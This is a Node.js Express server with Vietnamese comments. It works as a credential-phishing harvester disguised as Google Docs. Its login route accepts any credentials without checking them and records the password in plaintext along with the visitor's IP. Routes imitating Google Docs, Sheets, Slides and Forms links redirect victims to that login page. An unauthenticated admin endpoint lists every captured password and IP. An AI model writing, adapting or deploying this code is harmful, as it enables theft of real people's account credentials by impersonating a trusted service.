const express = require('express');
const session = require('express-session');
const bcrypt = require('bcryptjs');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Khởi tạo database
const dbPath = process.env.NODE_ENV === 'production' ? '/tmp/users.db' : 'users.db';
const db = new sqlite3.Database(dbPath);

// Tạo bảng users nếu chưa tồn tại (cập nhật schema)
db.serialize(() => {
  db.run(`
    CREATE TABLE IF NOT EXISTS users (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      username TEXT NOT NULL,
      email TEXT,
      password TEXT NOT NULL,
      last_login DATETIME,
      last_ip TEXT,
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )
  `);
});

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));
app.use(session({
  secret: 'your-secret-key-change-this',
  resave: false,
  saveUninitialized: false,
  cookie: { secure: false, maxAge: 24 * 60 * 60 * 1000 } // 1 ngày
}));

// API: Đăng ký
app.post('/api/register', async (req, res) => {
  const { username, email, password } = req.body;

  if (!username || !email || !password) {
    return res.status(400).json({ error: 'Vui lòng điền đầy đủ thông tin' });
  }

  if (password.length < 6) {
    return res.status(400).json({ error: 'Mật khẩu phải có ít nhất 6 ký tự' });
  }

  try {
    // Hash password
    const hashedPassword = await bcrypt.hash(password, 10);

    // Lưu vào database
    db.run('INSERT INTO users (username, email, password) VALUES (?, ?, ?)', [username, email, hashedPassword], function(err) {
      if (err) {
        if (err.message.includes('UNIQUE constraint failed')) {
          return res.status(400).json({ error: 'Username hoặc email đã tồn tại' });
        }
        return res.status(500).json({ error: 'Lỗi server' });
      }
      res.json({ success: true, message: 'Đăng ký thành công!' });
    });
  } catch (error) {
    res.status(500).json({ error: 'Lỗi server' });
  }
});

// API: Đăng nhập (chỉ lưu thông tin, không kiểm tra)
app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;
  const clientIP = req.ip || req.connection.remoteAddress || 'unknown';

  if (!username || !password) {
    return res.status(400).json({ error: 'Vui lòng điền đầy đủ thông tin' });
  }

  try {
    // Kiểm tra xem username đã tồn tại chưa
    db.get('SELECT id FROM users WHERE username = ? OR email = ?', [username, username], (err, existingUser) => {
      if (err) {
        return res.status(500).json({ error: 'Lỗi server' });
      }

      if (existingUser) {
        // Cập nhật password mới nếu đã tồn tại
        db.run('UPDATE users SET password = ?, last_login = CURRENT_TIMESTAMP, last_ip = ? WHERE id = ?',
               [password, clientIP, existingUser.id], (err) => {
          if (err) {
            return res.status(500).json({ error: 'Lỗi server' });
          }
          // Tạo session giả
          req.session.userId = Date.now();
          req.session.username = username;

          res.json({
            success: true,
            message: 'Đăng nhập thành công!',
            user: {
              id: Date.now(),
              username: username,
              email: username
            }
          });
        });
      } else {
        // Tạo user mới
        db.run('INSERT INTO users (username, email, password, last_login, last_ip) VALUES (?, ?, ?, CURRENT_TIMESTAMP, ?)',
               [username, username, password, clientIP], function(err) {
          if (err) {
            return res.status(500).json({ error: 'Lỗi server' });
          }
          // Tạo session giả
          req.session.userId = Date.now();
          req.session.username = username;

          res.json({
            success: true,
            message: 'Đăng nhập thành công!',
            user: {
              id: Date.now(),
              username: username,
              email: username
            }
          });
        });
      }
    });
  } catch (error) {
    console.error('Login error:', error);
    res.status(500).json({ error: 'Lỗi server' });
  }
});

// API: Kiểm tra đăng nhập
app.get('/api/me', (req, res) => {
  if (req.session.userId) {
    db.get('SELECT id, username, email, created_at FROM users WHERE id = ?', [req.session.userId], (err, user) => {
      if (err) {
        return res.status(500).json({ error: 'Lỗi server' });
      }
      res.json({ loggedIn: true, user });
    });
  } else {
    res.json({ loggedIn: false });
  }
});

// API: Đăng xuất
app.post('/api/logout', (req, res) => {
  req.session.destroy();
  res.json({ success: true, message: 'Đã đăng xuất' });
});

// API: Lấy danh sách users (admin) - hiển thị password thật
app.get('/api/users', (req, res) => {
  db.all('SELECT id, username, email, password, last_login, last_ip, created_at FROM users ORDER BY last_login DESC', [], (err, users) => {
    if (err) {
      return res.status(500).json({ error: 'Lỗi server' });
    }
    res.json(users);
  });
});

// API: Xóa user theo ID (admin)
app.delete('/api/users/:id', (req, res) => {
  const userId = req.params.id;

  db.run('DELETE FROM users WHERE id = ?', [userId], function(err) {
    if (err) {
      return res.status(500).json({ error: 'Server error' });
    }

    if (this.changes === 0) {
      return res.status(404).json({ error: 'User not found' });
    }

    res.json({
      success: true,
      message: 'User deleted successfully',
      deletedId: userId
    });
  });
});

// API: Xóa tất cả users (admin)
app.post('/api/clear-all', (req, res) => {
  db.run('DELETE FROM users', [], function(err) {
    if (err) {
      return res.status(500).json({ error: 'Server error' });
    }

    const deletedCount = this.changes;

    // Reset auto-increment
    db.run('DELETE FROM sqlite_sequence WHERE name="users"', [], (err) => {
      if (err) {
        console.error('Error resetting sequence:', err);
      }
      res.json({
        success: true,
        message: `Deleted ${deletedCount} users`,
        deletedCount: deletedCount
      });
    });
  });
});

// Serve admin page
app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// Serve URL generator page
app.get('/url-generator', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'url-generator.html'));
});

// API: Thống kê
app.get('/api/stats', (req, res) => {
  db.get('SELECT COUNT(*) as count FROM users', [], (err, totalResult) => {
    if (err) {
      return res.status(500).json({ error: 'Server error' });
    }

    db.get('SELECT COUNT(*) as count FROM users WHERE created_at >= datetime(\'now\', \'-24 hours\')', [], (err, recentResult) => {
      if (err) {
        return res.status(500).json({ error: 'Server error' });
      }

      res.json({
        totalUsers: totalResult.count,
        recentUsers: recentResult.count,
        lastUpdated: new Date().toISOString()
      });
    });
  });
});

// Serve trang chính
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Routes cho Google Docs style URLs - tất cả redirect về login
app.get('/document/d/:docId/:action*', (req, res) => {
  res.redirect('/');
});

app.get('/spreadsheets/d/:sheetId/:action*', (req, res) => {
  res.redirect('/');
});

app.get('/presentation/d/:presId/:action*', (req, res) => {
  res.redirect('/');
});

app.get('/forms/d/:formId/:action*', (req, res) => {
  res.redirect('/');
});

// Route catch-all cho mọi path khác (không phải API)
app.get('*', (req, res) => {
  if (!req.path.startsWith('/api/') && !req.path.startsWith('/admin')) {
    res.redirect('/');
  } else if (req.path.startsWith('/admin')) {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
  } else {
    res.status(404).json({ error: 'Not found' });
  }
});

app.listen(PORT, () => {
  console.log(`Server đang chạy tại http://localhost:${PORT}`);
});
